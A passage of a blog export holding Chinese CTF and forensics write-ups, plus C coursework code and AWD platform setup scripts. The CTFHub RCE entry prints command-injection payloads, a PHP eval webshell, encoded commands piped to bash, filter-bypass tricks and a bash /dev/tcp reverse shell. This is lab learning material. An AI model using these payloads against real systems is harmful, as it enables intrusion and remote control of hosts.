+<p>void mul(Linkedlist head,int p,int q){<br>    Linkedlist a = find_index(head,p);<br>    Linkedlist b = find_index(head,q);<br>    int c,d;<br>    c=(a-&gt;ss<em>b-&gt;ss)-(a-&gt;xs</em>b-&gt;xs);<br>    d=(a-&gt;ss<em>b-&gt;xs)-(a-&gt;xs</em>b-&gt;ss);<br>    complex_output(c,d);<br>}  </p>
+<p>void cut_ss(Linkedlist head,int p){<br>    Linkedlist a = find_index(head,p);<br>    printf(“%d\n”,a-&gt;ss);<br>}  </p>
+<p>void cut_xs(Linkedlist head,int p){<br>    Linkedlist a = find_index(head,p);<br>    printf(“%d\n”,a-&gt;xs);<br>}  </p>
+<p>int main()<br>{<br>    Linkedlist linkedlist=NULL;<br>    output();<br>    int a;<br>    int b=0;<br>    int p,q;<br>    while(1){<br>        scanf(“%d”,&amp;a);<br>        if(a==1){<br>            b++;<br>            printf(“添加复数，请输入实部 虚部：\n”);<br>            scanf(“%d %d”,&amp;p,&amp;q);<br>            Node *node = (Node *)malloc(sizeof(Node));<br>            node-&gt;index=b;<br>            node-&gt;ss=p;<br>            node-&gt;xs=q;<br>            node-&gt;next=NULL;<br>            linkedlist=insert(linkedlist,node);<br>            printf(“添加成功!\n”);<br>            link_output(linkedlist);<br>        }<br>        else if (a==2)<br>        {<br>            printf(“输入求和序号：\n”);<br>            scanf(“%d%d”,&amp;p,&amp;q);<br>            if(p&gt;b||q&gt;b){<br>                printf(“错误！请输入：\n”);<br>                continue;<br>            }<br>            add(linkedlist,p,q);<br>        }<br>        else if (a==3)<br>        {<br>            printf(“输入求差序号：\n”);<br>            scanf(“%d%d”,&amp;p,&amp;q);<br>            if(p&gt;b||q&gt;b){<br>                printf(“错误！请输入：\n”);<br>                continue;<br>            }<br>            sub(linkedlist,p,q);<br>        }<br>        else if (a==4)<br>        {<br>            printf(“输入求积序号：\n”);<br>            scanf(“%d%d”,&amp;p,&amp;q);<br>            if(p&gt;b||q&gt;b){<br>                printf(“错误！请输入：\n”);<br>                continue;<br>            }<br>            mul(linkedlist,p,q);<br>        }<br>        else if (a==5)<br>        {<br>            printf(“输入分离序号：\n”);<br>            scanf(“%d”,&amp;p);<br>            if(p&gt;b){<br>                printf(“错误！请输入：\n”);<br>                continue;<br>            }<br>            cut_ss(linkedlist,p);<br>        }<br>        else if(a==6)<br>        {<br>            printf(“输入分离序号：\n”);<br>            scanf(“%d”,&amp;p);<br>            if(p&gt;b){<br>                printf(“错误！请输入：\n”);<br>                continue;<br>            }<br>            cut_xs(linkedlist,p);<br>        }<br>    printf(“请输入:\n”);<br>    }<br>    return 0;<br>}</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>n赛 内存取证题解（已更新）</title>
+    <url>/2020/03/01/cnblog_12389284/</url>
+    <content><![CDATA[<h1 id="这是👉n赛-内存取证题解（已更新）👈的摘要"><a href="#这是👉n赛-内存取证题解（已更新）👈的摘要" class="headerlink" title="这是👉n赛 内存取证题解（已更新）👈的摘要"></a><a href="../../../../2020/03/01/cnblog_12389284/">这是👉n赛 内存取证题解（已更新）👈的摘要</a></h1><a id="more"></a>
+<p>题目是一个raw的镜像文件</p>
+<p>用volatility搜索一下进程</p>
+<p>有正常的notepad，msprint，还有dumpit和truecrypt</p>
+<pre><code>volatility -f mem.raw --profile=Win7SP1x86_23418 iehistory</code></pre>
+<p>查看ie历史的时候有一个百度网盘的连接但是没有密码</p>
+<p>提示放出了 记事本</p>
+<p>但是查notepad实在是没有什么收获</p>
+<p>上取证大师</p>
+<p><img src="https://img2018.cnblogs.com/i-beta/1619455/202003/1619455-20200301123933213-888119838.png"></p>
+<p> 这就很好用，恢复一下格式化了的数据，直接搜索txt后缀找到了提取码</p>
+<p>本来以为这题目就差不多了</p>
+<p>然后又下载下来一个加密文件VOL，扔到取证大师里显示truecrypt加密。</p>
+<p>去找内存密钥，直接truecrypt加密程序应该就可以</p>
+<p>在取证大师里同一个文件夹下找到了一个ky文件，试了试，解出来了</p>
+<p><img src="https://img2018.cnblogs.com/i-beta/1619455/202003/1619455-20200301124839816-417341318.png"></p>
+<p><img src="https://img2018.cnblogs.com/i-beta/1619455/202003/1619455-20200301124917531-968604686.png"></p>
+<p> 拿到了key，但是后来有大佬告诉我直接EFDD就能解出key</p>
+<p>然后手里拿着这个key懵了很久，以为是手动磁盘恢复，后来突然开了个脑洞，我拿key当作密码又重新解了一次truecrypt，竟然成功了</p>
+<p><img src="https://img2018.cnblogs.com/i-beta/1619455/202003/1619455-20200301125500822-1277690857.png"></p>
+<p> ok，一个加密的zip文件，密码不知道是啥。</p>
+<p>又回去找密码，ie，记事本，dumpit都用到了</p>
+<p>图片那里还没怎么用到，按照基本操作从内存恢复了几张图片</p>
+<pre><code>volatility -f mem.raw --profile=Win7SP1x86_23418 filescan |grep -E &#39;jpg|png|jpeg|bmp|gif&#39;</code></pre>
+<p>没什么结果，还有一个姿势是用gimp看dump出来的msprint.exe的数据。</p>
+<p>奈何我调不出来</p>
+<p><img src="https://img2018.cnblogs.com/blog/1619455/202003/1619455-20200301131033945-1005623356.png">这道题就死在这里了。。。</p>
+<p> -——–三天后————-</p>
+<p>抄了pur3大佬博客的参数，才出来原来这位移是要拖的。。。。</p>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200304213808095-876031532.png"></p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>awd平台搭建</title>
+    <url>/2020/02/10/cnblog_12290724/</url>
+    <content><![CDATA[<h1 id="这是👉awd平台搭建👈的摘要"><a href="#这是👉awd平台搭建👈的摘要" class="headerlink" title="这是👉awd平台搭建👈的摘要"></a><a href="../../../../2020/02/10/cnblog_12290724/">这是👉awd平台搭建👈的摘要</a></h1><a id="more"></a>
+<p>1.先是使用</p>
+<p><a href="https://github.com/m0xiaoxi/AWD_CTF_Platform">https://github.com/m0xiaoxi/AWD_CTF_Platform</a></p>
+<p>这个平台搭建</p>
+<p>这个平台很好用，是python脚本自动搭建，基本不需要怎么更改，自带了四道题的源码，有两道环境有问题，docker搭不起来，有时间再去解决把。</p>
+<p>2.之后就换成了</p>
+<p><a href="https://github.com/zhl2008/awd-platform">https://github.com/zhl2008/awd-platform</a></p>
+<p>可以看到这个平台好久没更新了，而且有许多小问题。</p>
+<p>这个平台带了好多题目，很大，要是用github那个20kb的下载速度，一晚上差不多把。</p>
+<p>之后也是直接使用自带的python脚本，但是一直给我报错can’t find web_14.04</p>
+<pre><code>python stop_clean.py
+python batch.py web_server 16
+python start.py ./ 16</code></pre>
+<p>用docker image search web_14.04是可以找到的，但是名称不一样，直接下载zhl2008/web_14.04就好。</p>
+<p>但是由于这两个名称不一样，需要修改dockerfile，后来索性就直接把本地的image名称改了，方便。</p>
+<pre><code>sudo docker tag zhl2008/web_14.04 web_14.04</code></pre>
+<p>实际上这个docker是一个ubuntu 14</p>
+<p>然后docker是没什么问题</p>
+<p>但是，之后发现，这个分数可以不受flag更新轮数限制，一个flag可以无限刷分。那不就是比谁脚本跑得快吗= =</p>
+<p>感觉在flag_server里time的脚本有关系，但是不怎么会改。</p>
+<p>于是，百度。。。</p>
+<p><img src="https://img2018.cnblogs.com/i-beta/1619455/202002/1619455-20200210132917461-350108307.png"></p>
+<p> 原来有人把坑都给踩好了的，早点百度就不用花那么多时间了</p>
+<p><a href="https://www.cnblogs.com/Triangle-security/p/11332223.html#">https://www.cnblogs.com/Triangle-security/p/11332223.html#</a></p>
+<pre><code>#!/usr/bin/env python
+
+#coding:UTF-8
+
+import time
+
+import os
+
+
+print int(time.time())
+
+Unix_time = int(time.time())
+
+print time.ctime(Unix_time)
+
+while True:
+
+    time_his = []
+
+    time_list = [&quot;00&quot;,&quot;05&quot;,&quot;10&quot;,&quot;15&quot;,&quot;20&quot;,&quot;25&quot;,&quot;30&quot;]
+
+    for i in time_list:
+
+        dt = &quot;2019-04-28 10:&quot;+str(i)+&quot;:00&quot;
+
+        time_his.append(dt)
+
+    a = time_his[0]
+
+    b = time_his[1]
+
+    c = time_his[2]
+
+    d = time_his[3]
+
+    e = time_his[4]
+
+    f = time_his[5]
+
+    g = time_his[6]
+
+    time_stamp = [a,b,c,d,e,f,g]
+
+    for k in time_stamp:
+
+            h = open(&quot;time.txt&quot;, &#39;w+&#39;)
+
+            timeArray = time.strptime(k, &quot;%Y-%m-%d %H:%M:%S&quot;)
+
+            timestamp = time.mktime(timeArray)
+
+            print (int(timestamp))
+
+            data = (int(timestamp))
+
+            separated = &#39;|&#39;
+
+            zero = &#39;0&#39;
+
+            print &gt;&gt;h,(zero),(separated),(data),(separated),(zero),(separated),(data),(separated),(zero),(separated),(zero),(separated),(data),(separated),(zero),(separated),(zero),
+
+            #           0|data|0|data|0|0|data|0|0
+
+            h.close()
+
+            time.sleep(300)</code></pre>
+<p>在flag那里提前启动这个脚本就行了，还要准时提前5min，好像不大聪明的亚子==</p>
+<p>算了，谁让我只会傻瓜操作呢==</p>
+<p>放上我的一键化脚本，稍加修改，不出意外的话，应该是可以成功的。</p>
+<pre><code>#!/bin/bash
+#git clone https://github.com/zhl2008/awd-platform #下载源码
+apt-get install -y curl
+curl -fsSL https://get.docker.com -o get-docker.sh
+sudo sh get-docker.sh
+cd awd-platform/
+docker pull zhl2008/web_14.04
+docker tag zhl2008/web_14.04 web_14.04
+#cd flag_server
+#python time.py(时间的那个脚本)
+#cd ..
+#sleep(300)
+python stop_clean.py
+python batch.py web_server 16
+python start.py ./ 16</code></pre>
+<p>大概就是这样子了，服务器的话，每次都去阿里云买一个按量计费的，一次比赛几个小时也就不到十块钱，十几个队是完全够用的。</p>
+<p>其实这两个平台挺像的，都是python写的自动化脚本，对docker有没什么理解也可以，python脚本修改每个docker的配置脚本，用的docker搭建靶机的环境，python服务生成并检查flag，再加减分数，再写个前端展示分数和攻击过程。诶，说上去很简单的样子。动手能力强的话可以尝试把它改的更完美一些。</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTFHub web技能树 RCE</title>
+    <url>/2020/03/04/cnblog_12411264/</url>
+    <content><![CDATA[<h1 id="这是👉CTFHub-web技能树-RCE👈的摘要"><a href="#这是👉CTFHub-web技能树-RCE👈的摘要" class="headerlink" title="这是👉CTFHub web技能树 RCE👈的摘要"></a><a href="../../../../2020/03/04/cnblog_12411264/">这是👉CTFHub web技能树 RCE👈的摘要</a></h1><a id="more"></a>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200304181058351-1636148437.png"></p>
+<p> 一个简单的ping，还没有过滤，源码也给出来了</p>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200304181216393-380702226.png"></p>
+<p>ls一下</p>
+<pre><code>127.0.0.1 &amp; ls</code></pre>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200304181145577-2083532062.png"></p>
+<p>有一个可疑的php文件，，，但是直接访问和 cat 都出不来。。。</p>
+<p>试了几下反弹shell，没成功。。。于是直接用echo了一个一句话进去</p>
+<pre><code>127.0.0.1 &amp; echo &quot;&lt;?php eval(@\$_POST[&#39;a&#39;]);?&gt;&quot; &gt; 3.php</code></pre>
+<p>注意这里$转义了一下，不转的话会被识别成变量。。</p>
+<p>之后拿我40米长的菜刀</p>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200304181721672-457150244.png"></p>
+<p> php用了注释。。和想的差不多</p>
+<p>这题竟然花了那么久</p>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200304181831162-848034212.png"></p>
+<p>我是这样反弹shell。。</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></pre>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200310220338667-66858326.png"></p>
+<p> 过滤空格的</p>
+<pre><code>127.0.0.1&amp;cat&lt;flag_10974101912578.php</code></pre>
+<p>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等</p>
+<h1 id="命令注入-过滤目录分隔符"><a href="#命令注入-过滤目录分隔符" class="headerlink" title="命令注入-过滤目录分隔符"></a>命令注入-过滤目录分隔符</h1><pre><code>cat \\flag_is_here\\flag_12052032130931.php  
+
+Y2F0IFxcZmxhZ19pc19oZXJlXFxmbGFnXzEyMDUyMDMyMTMwOTMxLnBocA  
+127.0.0.1 &amp; echo Y2F0IFxcZmxhZ19pc19oZXJlXFxmbGFnXzEyMDUyMDMyMTMwOTMxLnBocA | base64 -d | bash  
+
+&lt;?php eval(@$_POST[&#39;a&#39;]);?&gt;  
+3C3F706870206576616C2840245F504F53545B2761275D293B3F3E  
+127.0.0.1 &amp; echo 3C3F706870206576616C2840245F504F53545B2761275D293B3F3E | xxd -r -ps &gt; 4.php</code></pre>
+<p>感觉这两种绕过应该都可以成功啊，可是他就是都没成功。。。。</p>
+<p>[GXYCTF2019]Ping Ping Ping</p>
+<p>过滤了空格，&lt;，flag</p>
+<p>空格用$IFS可以，再拼接一下，绕过</p>
+<p><img src="https://img2020.cnblogs.com/blog/1619455/202004/1619455-20200408155704519-1492536337.png"></p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>n赛 ML 第一步（python解决）</title>
+    <url>/2020/03/05/cnblog_12420367/</url>
+    <content><![CDATA[<h1 id="这是👉n赛-ML-第一步（python解决）👈的摘要"><a href="#这是👉n赛-ML-第一步（python解决）👈的摘要" class="headerlink" title="这是👉n赛 ML 第一步（python解决）👈的摘要"></a><a href="../../../../2020/03/05/cnblog_12420367/">这是👉n赛 ML 第一步（python解决）👈的摘要</a></h1><a id="more"></a>
+<p><a href="https://buuoj.cn/challenges#[V&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B]ML%20%E7%AC%AC%E4%B8%80%E6%AD%A5">题目链接</a></p>
+<p>给了70组x,y，根据提示，是求拟合曲线，再通过x求y</p>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200305150510004-342230045.png"></p>
+<p> 知道MATLAB应该录入就能解决吧，但是没下这软件，试试用python解决</p>
+<pre><code>#coding:utf-8
+from pwn import *
+import numpy as np
+import matplotlib.pyplot as plt
+import re
+
+p=remote(&#39;node3.buuoj.cn&#39;,25402)
+p.recvuntil(&quot;hello,whats your name?&quot;)
+p.sendline(&quot;payload&quot;)
+print(p.recvline())
+print(p.recvline())
+print(p.recvline())
+print(p.recvline())
+print(p.recvline())
+n=&quot;\n&quot;
+p.sendline(n)
+x=np.zeros(70)
+y=np.zeros(70)
+for i in range(0,70):
+    a=p.recvline()
+    #print(a)
+    match = re.search( r&#39;=(.*?),(.*?);&#39;, a)
+    x1=match.group(1)
+    #print(x)
+    x[i]=x1
+    y1=match.group(2)
+    y1=y1[2:]
+    y[i]=y1
+    #print(y)
+print(x)
+print(y)
+#x = x.array(y, dtype=&#39;S32&#39;)
+x = x.astype(&#39;float64&#39;)
+#y = np.array(y, dtype=&#39;S32&#39;)
+y = y.astype(&#39;float64&#39;)
+poly = np.polyfit(x, y, deg = 2)
+p.recvline()for j in range(0,10):
+    response=p.recvline()
+    x_need=response[7:-5]
+    x_need=float(x_need)
+    #x_need=np.fromstring(x_need)
+    #x_need = x_need.astype(&#39;float64&#39;)
+    print(x_need)
+    y_need=np.polyval(poly, x_need)
+
+    print(y_need)
+    y_need=str(y_need)
+    p.sendline(y_need)
+
+b=p.recvline()
+print(b)</code></pre>
+<p>很简单，通过numpy库的polyfit和polyval就能解决</p>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200305151200674-921393784.png"></p>
+<p> 附上官网参考文件</p>
+<pre><code>https://ww2.mathworks.cn/help/matlab/ref/polyfit.html
+https://www.numpy.org.cn/</code></pre>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>快捷指令写爬虫程序</title>
+    <url>/2020/03/02/cnblog_12397873/</url>
+    <content><![CDATA[<h1 id="这是👉快捷指令写爬虫程序👈的摘要"><a href="#这是👉快捷指令写爬虫程序👈的摘要" class="headerlink" title="这是👉快捷指令写爬虫程序👈的摘要"></a><a href="../../../../2020/03/02/cnblog_12397873/">这是👉快捷指令写爬虫程序👈的摘要</a></h1><a id="more"></a>
+<p>花了一个下午，利用ios的快捷指令做出了爬取妹子图图片的爬虫程序，一共30个操作</p>
+<pre><code>https://www.icloud.com/shortcuts/b65a433365f94cc98adff2d450806176</code></pre>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200302201501522-1917635992.png"></p>
+<p>首先利用网络模块对网站首页进行访问，网站是有反爬机制的，</p>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200302201717101-366160647.png"></p>
+<p> 利用这个修改头部可以绕过。</p>
+<p>快捷指令没有类似于xpath的库，只有最基本的正则表达式，也是可以实现对网页内容的正则的</p>
+<p>利用两个正则，将首页中套图的网址找到，对其进行访问。</p>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200302203146740-1997320287.png"></p>
+<p> 有一堆网站的时候可以按行拆分</p>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200302203326404-112724642.png"></p>
+<p> 这里是对第二张图片进行访问的代码，由于网址的构造是   ip/套图号/图片号<br>的形式，图片号就是12345.。。所以我直接找到最大图片数，然后利用重复模块访问</p>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200302203713238-277942307.png"></p>
+<p> 对图片的网址进行访问，就能得图片了，</p>
+<p>剩下的查看图片或者保存图片就很简单了</p>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200302203904916-537484053.png"></p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>usb</title>
+    <url>/2020/03/10/cnblog_12455527/</url>
+    <content><![CDATA[<h1 id="这是👉usb👈的摘要"><a href="#这是👉usb👈的摘要" class="headerlink" title="这是👉usb👈的摘要"></a><a href="../../../../2020/03/10/cnblog_12455527/">这是👉usb👈的摘要</a></h1><a id="more"></a>
+<p>打开之后是一个流量包</p>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200310142459674-223493812.png"></p>
+<p>用wireshark导出HTTP文件，有个upload,用一下binwalk，出来了一个镜像文件</p>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200310142603761-942514529.png"></p>
+<p> 用volatility搜一下，命令里有一个密码，看见了但是后来给忘了。。。</p>
+<p>文件里有一个flag.img，导出</p>
+<p>里面有一个压缩包，导出</p>
+<p>或者用取证大师直接打开data.vmem就能看到压缩包</p>
+<p>用cmd里的密码解压压缩包</p>
+<p>一串字符，可以看出是usb键盘与电脑通信的流量</p>
+<p>用一下网上搜到的脚本</p>
+<pre><code>import sys
+import os
+
+
+usb_codes = &#123;
+   0x04:&quot;aA&quot;, 0x05:&quot;bB&quot;, 0x06:&quot;cC&quot;, 0x07:&quot;dD&quot;, 0x08:&quot;eE&quot;, 0x09:&quot;fF&quot;,
+   0x0A:&quot;gG&quot;, 0x0B:&quot;hH&quot;, 0x0C:&quot;iI&quot;, 0x0D:&quot;jJ&quot;, 0x0E:&quot;kK&quot;, 0x0F:&quot;lL&quot;,
+   0x10:&quot;mM&quot;, 0x11:&quot;nN&quot;, 0x12:&quot;oO&quot;, 0x13:&quot;pP&quot;, 0x14:&quot;qQ&quot;, 0x15:&quot;rR&quot;,
+   0x16:&quot;sS&quot;, 0x17:&quot;tT&quot;, 0x18:&quot;uU&quot;, 0x19:&quot;vV&quot;, 0x1A:&quot;wW&quot;, 0x1B:&quot;xX&quot;,
+   0x1C:&quot;yY&quot;, 0x1D:&quot;zZ&quot;, 0x1E:&quot;1!&quot;, 0x1F:&quot;2@&quot;, 0x20:&quot;3#&quot;, 0x21:&quot;4$&quot;,
+   0x22:&quot;5%&quot;, 0x23:&quot;6^&quot;, 0x24:&quot;7&amp;&quot;, 0x25:&quot;8*&quot;, 0x26:&quot;9(&quot;, 0x27:&quot;0)&quot;,
+   0x2C:&quot;  &quot;, 0x2D:&quot;-_&quot;, 0x2E:&quot;=+&quot;, 0x2F:&quot;[&#123;&quot;, 0x30:&quot;]&#125;&quot;,  0x32:&quot;#~&quot;,
+   0x33:&quot;;:&quot;, 0x34:&quot;&#39;\&quot;&quot;,  0x36:&quot;,&lt;&quot;,  0x37:&quot;.&gt;&quot;, 0x4f:&quot;&gt;&quot;, 0x50:&quot;&lt;&quot;
+   &#125;
+
+def code2chr(filepath):
+    lines = []
+    pos = 0
+    for x in open(filepath,&quot;r&quot;).readlines():
+        code = int(x[6:8],16)   # 即第三个字节
+        if code == 0:
+            continue
+        # newline or down arrow - move down
+        if code == 0x51 or code == 0x28:
+            pos += 1
+            continue
+        # up arrow - move up
+        if code == 0x52:
+            pos -= 1
+            continue
+
+        # select the character based on the Shift key
+        while len(lines) &lt;= pos:
+            lines.append(&quot;&quot;)
+        if code in range(4,81):
+            if int(x[0:2],16) == 2:
+                lines[pos] += usb_codes[code][1]
+            else:
+                lines[pos] += usb_codes[code][0]
+
+    for x in lines:
+        print(x)
+
+
+if __name__ == &quot;__main__&quot;:
+    # check argv
+    filepath = &#39;usbdata.txt&#39;
+    code2chr(filepath)
+    &#39;&#39;&#39;
+    if len(sys.argv) != 2:
+        print(&quot;Usage:\n\tpython keyboardScanCode.py datafile.txt\nhow to get datafile:\t tshark -r file.usb.pcapng -T fields -e usb.capdata &gt; datafile.txt&quot;)
+        exit(1)
+    else:
+        filepath = sys.argv[1]
+        code2chr(filepath)
+    &#39;&#39;&#39;</code></pre>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>jarvisoj MISC 取证2</title>
+    <url>/2020/03/11/cnblog_12465071/</url>
+    <content><![CDATA[<h1 id="这是👉jarvisoj-MISC-取证2👈的摘要"><a href="#这是👉jarvisoj-MISC-取证2👈的摘要" class="headerlink" title="这是👉jarvisoj MISC 取证2👈的摘要"></a><a href="../../../../2020/03/11/cnblog_12465071/">这是👉jarvisoj MISC 取证2👈的摘要</a></h1><a id="more"></a>
+<p>打开之后一个文件和一个镜像</p>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200311181944055-680420648.png"></p>
+<p> TrueCrypt。。。。记住他了，再看一眼那个文件，好的，TrueCrypt加密。。找密码</p>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200312102533606-1478262349.png"></p>
+<p>把Truecrypt.exe直接dump下来，用efdd解密就行了</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>安恒四月春季赛 MISC keyboard</title>
+    <url>/2020/04/26/cnblog_12781871/</url>
+    <content><![CDATA[<h1 id="这是👉安恒四月春季赛-MISC-keyboard👈的摘要"><a href="#这是👉安恒四月春季赛-MISC-keyboard👈的摘要" class="headerlink" title="这是👉安恒四月春季赛 MISC keyboard👈的摘要"></a><a href="../../../../2020/04/26/cnblog_12781871/">这是👉安恒四月春季赛 MISC keyboard👈的摘要</a></h1><a id="more"></a>
+<p>打开发现是raw+secret的配置///我猜又是个加密盘</p>
+<p><img src="https://img2020.cnblogs.com/blog/1619455/202004/1619455-20200426194658663-1881987846.png"></p>
+<p>用volatility打开，看下进程。。。就是他了，veracrypt加密。</p>
+<p>还有这个keyboard-log的进程再根据题目提示，找下文件</p>
+<p><img src="https://img2020.cnblogs.com/blog/1619455/202004/1619455-20200426194908519-1404056544.png"></p>
+<p> dump下来看一眼</p>
+<p><img src="https://img2020.cnblogs.com/blog/1619455/202004/1619455-20200426194949703-301053867.png"></p>
+<p> 哥哥你这属实有些脑洞啊</p>
+<p>看这个ABC，我猜古典密码。。。。</p>
+<p>我按照ctfwiki一个个试还不行吗</p>
+<p>最后试出来试qwe密码</p>
+<p>解密之后直接搜索就能搜到flag了</p>
+<p> 也不能算难题[狗头]</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>虎符ctf-MISC-奇怪的组织(看完官方题解，找到了)</title>
+    <url>/2020/04/19/cnblog_12733364/</url>
+    <content><![CDATA[<h1 id="这是👉虎符ctf-MISC-奇怪的组织-看完官方题解，找到了-👈的摘要"><a href="#这是👉虎符ctf-MISC-奇怪的组织-看完官方题解，找到了-👈的摘要" class="headerlink" title="这是👉虎符ctf-MISC-奇怪的组织(看完官方题解，找到了)👈的摘要"></a><a href="../../../../2020/04/19/cnblog_12733364/">这是👉虎符ctf-MISC-奇怪的组织(看完官方题解，找到了)👈的摘要</a></h1><a id="more"></a>
+<p>一道取证题，一整场比赛，基本就死磕了这一题</p>
+<p>写的很乱，因为当时的思维就是那么乱，完全没有注意到出题人的提示，</p>
+<p>还没做出来，没有找到关键key 那个人的real name</p>
+<p>文档：虎符.note<br>链接：<a href="http://note.youdao.com/noteshare?id=3b839a3228f73f74199ff52bf1df8806">http://note.youdao.com/noteshare?id=3b839a3228f73f74199ff52bf1df8806</a></p>
+<p>拿着这么好用的工具做不出来题。。。没有取证大师我可能连邮件文件的储存位置都找不到</p>
+<p>#希望会了的大佬教教我，也欢迎大家一起来找key</p>
+<p>-——————————–</p>
+<p>看完官方题解了。。。就差了一个key</p>
+<p>文件藏在了</p>
+<p>Thunder\Users\bob\Pictures\Camera<br>Roll\sdcard\Android\data\com.android.backup\files\pending_blobs</p>
+<p>可以看到，这是sd卡的数据里，在图片文件夹里也有道理</p>
+<p>做题的时候确实翻到了picture这个文件夹，但是确实没注意到sd卡这个东西，确实有些脑洞</p>
+<p>做题的时候在想怎么找，主要是想系统用户。。。确实没翻到</p>
+<p>虽然说正常思路也想不到这里把。。。</p>
+<p> 怎么才能发现这玩意呢。。。</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2020网鼎杯青龙组 MISC 虚幻2</title>
+    <url>/2020/05/16/cnblog_12900273/</url>
+    <content><![CDATA[<h1 id="这是👉2020网鼎杯青龙组-MISC-虚幻2👈的摘要"><a href="#这是👉2020网鼎杯青龙组-MISC-虚幻2👈的摘要" class="headerlink" title="这是👉2020网鼎杯青龙组 MISC 虚幻2👈的摘要"></a><a href="../../../../2020/05/16/cnblog_12900273/">这是👉2020网鼎杯青龙组 MISC 虚幻2👈的摘要</a></h1><a id="more"></a>
+<p>我也希望misc能输出啊 ，可是实力不允许啊  题目给了一个图片<br><img src="https://img2020.cnblogs.com/blog/1619455/202005/1619455-20200516120720521-645268486.png"><br>查看像素发现是36*12，汉信码应该是正方形，这个图片还是有点规律的，感觉应该是什么压缩之类的，但是没想到是看RGB，其实正常的话还是应该看一下rgb的。。。还是太菜了hhh<br>每个像素有三个rgb，分出来，是255的话就是1，是0的话就是0。 <code>from PIL import Image x = 36 #x坐标 y = 12 #y坐标 im=Image.open(&#39;file.png&#39;) file = open(&#39;11&#39;,&#39;w&#39;) #im.show() z=&#39;&#39; for i in range(0, x): for j in range(0, y): rgb=im.getpixel((i, j)) print(rgb) if(rgb[0]==0): z+=&#39;1&#39; elif(rgb[0]==255): z+=&#39;0&#39; if(rgb[1]==0): z+=&#39;1&#39; elif(rgb[1]==255): z+=&#39;0&#39; if(rgb[2]==0): z+=&#39;1&#39; elif(rgb[2]==255): z+=&#39;0&#39; print(z) file.write(z)</code> 一个读出一个写入。。 <code>from PIL import Image x = 36 #x坐标 y = 36 #y坐标 im = Image.new(&quot;RGB&quot;, (x, y)) file = open(&#39;11&#39;,&#39;r&#39;) a=file.read() z=0 for i in range(0, x): for j in range(0, y): print(a[z]) if(a[z]==&#39;1&#39;): im.putpixel((i, j), (255, 255, 255)) elif(a[z]==&#39;0&#39;): im.putpixel((i, j), (0, 0, 0)) z=z+1 im.show() im.save(&#39;1.png&#39;)</code><br>再组成汉信码，在进行一下小修改，最后空白的一部分提示是爆破，可以直接画两下，分辨的时候会自动修复<br><img src="https://img2020.cnblogs.com/blog/1619455/202005/1619455-20200516135747247-950806998.png"><br>跟二维码一样也有差错校验。。。也是应该的吧</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>服务器运维抓包练习</title>
+    <url>/2020/05/19/cnblog_12919431/</url>
+    <content><![CDATA[<h1 id="这是👉服务器运维抓包练习👈的摘要"><a href="#这是👉服务器运维抓包练习👈的摘要" class="headerlink" title="这是👉服务器运维抓包练习👈的摘要"></a><a href="../../../../2020/05/19/cnblog_12919431/">这是👉服务器运维抓包练习👈的摘要</a></h1><a id="more"></a>
